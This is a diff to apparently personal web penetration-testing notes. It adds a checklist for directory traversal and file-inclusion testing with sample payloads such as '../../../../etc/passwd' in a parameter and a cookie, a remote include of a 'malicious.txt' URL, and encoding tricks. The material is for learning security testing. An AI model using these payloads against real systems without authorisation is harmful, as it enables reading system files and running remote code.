@@ -271,7 +271,7 @@ Upon account creation it is required the user to select _pregenerated_ or _custo
 - Does this process requests information before changing password?
 - Is the old password requested in order to complete the change?
 # Testing for weaker authentication in alternative channel
-Firstly, identify alternative channels suck as
+Firstly, identify alternative channels such as
 - other website or web app
 - mobile app
 - accessibility optimized version
@@ -284,9 +284,32 @@ Indetify alternative channels by
 - Reading Home, Contact, FAQ etc
 - HTTP proxy logs search for strings "mobile", "android", "ipad", "mobile", "auth", "sso" etc
 - Use search engines to find different sites from the same organization
-- Does an alternative channel has any extra functionality (eg. password reset)
 
+_Does an alternative channel has any extra functionality (eg. password reset)_
 _Alternative channels should always be mentioned in test report even as "information only"_
+
+# Testing directory traversla/file include (aka ../)
+2 different stages
+- Input vectors enumeration
+  - Are there request parameters that could be used for file related operations?
+  - Are there any unusual file extensions?
+  - Are there any interesting variable names (?item=......, file=......, ?home=...... etc)
+  - Identify cookies for dynamic page generation or templates (TEMPLATE = flower, TEMPLATE = GreenDotRed etc)
+- Testing techniques
+  - ?item=../../../../etc/passwd
+  - Cookie:.....PSTYLE=../../../../etc/passwd
+  - Include files and scripts on external website
+    - ?file=http://......./malicious.txt
+    - ?home=main.cgi
+  - Usual encodings
+    - . -> dot
+    - %00 -> null
+  - Try encodings
+    - url encoding and double url encoding
+    - unicode/utf8 encoding
+      - ../
+      - .. \ and more
+      
 
  
 
